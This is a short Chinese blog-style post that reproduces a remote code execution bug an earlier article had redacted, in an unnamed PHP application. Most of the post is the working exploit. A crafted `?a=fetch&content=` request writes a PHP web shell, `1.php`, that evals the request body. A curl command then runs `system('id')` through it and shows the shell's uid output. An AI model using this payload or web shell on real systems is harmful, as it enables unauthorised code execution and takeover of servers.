今天看了这篇文章

https://www.freebuf.com/vuls/217586.html 

看到有个rce被打码了，于是分析一下代码。搞定。

?a=fetch&content=<?php+file_put_contents("1.php","<?php+@eval(file_get_contents('php://input'));");

➜ curl http://xxxxxxx/1.php --data "system('id');"    
uid=1000(www) gid=1000(www) groups=1000(www)


顺便说一下这个漏洞之前在先知上发过。https://xz.aliyun.com/t/3529
